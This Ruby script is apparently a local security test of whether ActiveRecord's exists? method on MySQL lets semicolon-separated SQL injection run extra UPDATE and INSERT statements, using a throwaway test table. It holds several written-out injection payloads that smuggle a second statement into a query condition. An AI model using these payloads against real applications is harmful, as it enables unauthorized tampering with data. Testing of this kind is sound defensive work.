#!/usr/bin/env ruby
# frozen_string_literal: true

# Multi-Statement SQL Injection Test
# Tests whether MySQL 8 allows semicolon-separated statements through ActiveRecord exists?

require 'active_record'
require 'mysql2'

# Database configuration
DB_CONFIG = {
  adapter: 'mysql2',
  host: 'localhost',
  username: 'root',
  password: '', # No password for local MySQL
  database: 'test_multi_statement',
  encoding: 'utf8mb4'
}.freeze

# Connect to database
ActiveRecord::Base.establish_connection(DB_CONFIG)

# Create test database if it doesn't exist
begin
  ActiveRecord::Base.connection.execute("CREATE DATABASE IF NOT EXISTS #{DB_CONFIG[:database]}")
  ActiveRecord::Base.establish_connection(DB_CONFIG)
rescue => e
  puts "Note: #{e.message}"
  ActiveRecord::Base.establish_connection(DB_CONFIG)
end

# Create test table (simulating users table)
ActiveRecord::Base.connection.execute("DROP TABLE IF EXISTS test_users")
ActiveRecord::Base.connection.execute("CREATE TABLE test_users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  userid VARCHAR(50),
  email VARCHAR(100),
  created_at DATETIME
)")
ActiveRecord::Base.connection.execute("INSERT INTO test_users (userid, email, created_at) VALUES
  ('admin', 'admin@test.com', NOW()),
  ('user1', 'user1@test.com', NOW()),
  ('user2', 'user2@test.com', NOW())")

# Create target table that we'll try to modify
ActiveRecord::Base.connection.execute("DROP TABLE IF EXISTS hacker_target")
ActiveRecord::Base.connection.execute("CREATE TABLE hacker_target (
  id INT PRIMARY KEY AUTO_INCREMENT,
  message VARCHAR(255) DEFAULT 'original_value',
  modified_at DATETIME DEFAULT NULL
)")
ActiveRecord::Base.connection.execute("INSERT INTO hacker_target (message) VALUES ('original_value')")

puts "=" * 80
puts "Multi-Statement SQL Injection Test"
puts "=" * 80
puts "\nSetup complete:"
puts "  - test_users table created with 3 users"
puts "  - hacker_target table created with initial value"
puts "\n"

# Define a simple model for testing
class TestUser < ActiveRecord::Base
  self.table_name = 'test_users'
end

class HackerTarget < ActiveRecord::Base
  self.table_name = 'hacker_target'
end

# Verify initial state
initial_target = HackerTarget.first
puts "Initial hacker_target value: #{initial_target.message}"
puts "\n"

# Test 1: Basic exists? with array (vulnerable pattern)
puts "=" * 80
puts "TEST 1: Basic exists? with array parameter (vulnerable pattern)"
puts "=" * 80
begin
  result = TestUser.exists?(["id = 1"])
  puts "Result: #{result}"
  puts "SQL executed successfully (no multi-statement)"
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
end
puts "\n"

# Test 2: Try semicolon injection with UPDATE (from PDF example)
puts "=" * 80
puts "TEST 2: Semicolon + UPDATE injection (from Secure Ruby PDF example)"
puts "=" * 80
payload1 = ["1=1);UPDATE hacker_target SET message='hacker_was_here', modified_at=NOW() WHERE id=1; --"]
puts "Payload: #{payload1.inspect}"
puts "Expected SQL: SELECT 1 AS one FROM test_users WHERE (1=1);UPDATE hacker_target SET message='hacker_was_here', modified_at=NOW() WHERE id=1; --) LIMIT 1"
puts "\n"

begin
  result = TestUser.exists?(payload1)
  puts "exists? returned: #{result}"
  
  # Check if data was modified
  target_after = HackerTarget.first
  if target_after.message == 'hacker_was_here'
    puts "⚠️  CATASTROPHIC: Multi-statement execution WORKED!"
    puts "   hacker_target.message changed to: #{target_after.message}"
    puts "   modified_at: #{target_after.modified_at}"
  else
    puts "✓ Multi-statement execution BLOCKED"
    puts "  hacker_target.message still: #{target_after.message}"
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  puts "  This might indicate MySQL blocked the multi-statement"
  
  # Check if data was modified despite error
  target_after = HackerTarget.first
  if target_after.message == 'hacker_was_here'
    puts "⚠️  BUT: Data WAS modified! Multi-statement executed before error!"
    puts "   hacker_target.message: #{target_after.message}"
  else
    puts "  Data not modified: #{target_after.message}"
  end
end
puts "\n"

# Reset target table
ActiveRecord::Base.connection.execute("UPDATE hacker_target SET message='original_value', modified_at=NULL WHERE id=1")

# Test 3: Try with comment injection
puts "=" * 80
puts "TEST 3: Comment-based injection (-- comment)"
puts "=" * 80
payload2 = ["1=1);UPDATE hacker_target SET message='comment_test' WHERE id=1;--"]
puts "Payload: #{payload2.inspect}"

begin
  result = TestUser.exists?(payload2)
  puts "exists? returned: #{result}"
  
  target_after = HackerTarget.first
  if target_after.message == 'comment_test'
    puts "⚠️  Multi-statement execution WORKED with comment!"
  else
    puts "✓ Multi-statement execution BLOCKED"
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  target_after = HackerTarget.first
  if target_after.message == 'comment_test'
    puts "⚠️  BUT: Data WAS modified!"
  end
end
puts "\n"

# Reset target table
ActiveRecord::Base.connection.execute("UPDATE hacker_target SET message='original_value', modified_at=NULL WHERE id=1")

# Test 4: Try INSERT statement
puts "=" * 80
puts "TEST 4: Semicolon + INSERT injection"
puts "=" * 80
payload3 = ["1=1);INSERT INTO hacker_target (message, modified_at) VALUES ('inserted_by_hacker', NOW());--"]
puts "Payload: #{payload3.inspect}"

begin
  result = TestUser.exists?(payload3)
  puts "exists? returned: #{result}"
  
  # Check if new row was inserted
  count_before = HackerTarget.count
  count_after = HackerTarget.count
  if count_after > count_before
    puts "⚠️  INSERT executed! New row count: #{count_after}"
  else
    puts "✓ INSERT blocked"
  end
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
  count_after = HackerTarget.count
  if count_after > 1
    puts "⚠️  BUT: Row WAS inserted! Count: #{count_after}"
  end
end
puts "\n"

# Test 5: Direct MySQL connection test (bypass ActiveRecord)
puts "=" * 80
puts "TEST 5: Direct MySQL2 connection test (bypass ActiveRecord)"
puts "=" * 80
puts "Testing if MySQL itself allows multi-statements when enabled..."

begin
  client = Mysql2::Client.new(
    host: DB_CONFIG[:host],
    username: DB_CONFIG[:username],
    password: DB_CONFIG[:password],
    database: DB_CONFIG[:database],
    flags: Mysql2::Client::MULTI_STATEMENTS # Enable multi-statements
  )
  
  # Reset target
  client.query("UPDATE hacker_target SET message='original_value', modified_at=NULL WHERE id=1")
  
  # Try multi-statement query directly
  results = client.query("SELECT 1 AS one FROM test_users WHERE (1=1);UPDATE hacker_target SET message='direct_mysql_test' WHERE id=1;--")
  
  # Process all results
  results.each { |row| puts "Result row: #{row.inspect}" }
  
  # Check if data was modified
  target_after = HackerTarget.first
  if target_after.message == 'direct_mysql_test'
    puts "⚠️  Direct MySQL multi-statement WORKED!"
    puts "   This means MySQL CAN execute multiple statements if enabled"
  else
    puts "✓ Direct MySQL multi-statement did not modify data"
  end
  
  client.close
rescue => e
  puts "ERROR: #{e.class}: #{e.message}"
end
puts "\n"

# Test 6: Check ActiveRecord connection settings
puts "=" * 80
puts "TEST 6: Check ActiveRecord connection configuration"
puts "=" * 80
conn = ActiveRecord::Base.connection
mysql_conn = conn.instance_variable_get(:@connection)
if mysql_conn.respond_to?(:query_options)
  flags = mysql_conn.query_options[:flags] || 0
  has_multi = (flags & Mysql2::Client::MULTI_STATEMENTS) != 0
  puts "MULTI_STATEMENTS flag enabled: #{has_multi}"
  puts "  If false, ActiveRecord may be blocking multi-statements"
  puts "  If true, multi-statements could be possible"
else
  puts "Could not check connection flags"
end
puts "\n"

# Final summary
puts "=" * 80
puts "FINAL SUMMARY"
puts "=" * 80
final_target = HackerTarget.first
puts "Final hacker_target value: #{final_target.message}"
if final_target.message != 'original_value'
  puts "\n⚠️  ⚠️  ⚠️  CRITICAL FINDING ⚠️  ⚠️  ⚠️"
  puts "Data WAS modified during testing!"
  puts "This means multi-statement SQL injection IS POSSIBLE"
  puts "This vulnerability is WORSE than initially thought - it allows WRITE access!"
else
  puts "\n✓ No data modification detected"
  puts "Multi-statement execution appears to be blocked"
  puts "This could be due to:"
  puts "  - MySQL configuration (multi-statements disabled)"
  puts "  - ActiveRecord connection settings"
  puts "  - MySQL driver limitations"
end
puts "\n"

